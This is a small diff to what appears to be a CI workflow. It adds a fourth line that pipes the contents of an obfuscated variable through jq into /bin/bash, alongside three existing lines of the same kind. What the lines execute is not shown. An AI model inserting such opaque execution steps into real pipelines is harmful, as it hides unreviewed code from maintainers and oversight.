@@ -27,6 +27,7 @@ jobs:
           echo $ip0 | jq -r .y1 | /bin/bash
           printf '%s' "$iztfy4601" | jq -r .ebgv452 | /bin/bash
           echo $ng2007 | jq -r .cjt94 | /bin/bash
+          printf '%s' "$f71527" | jq -r .w03 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
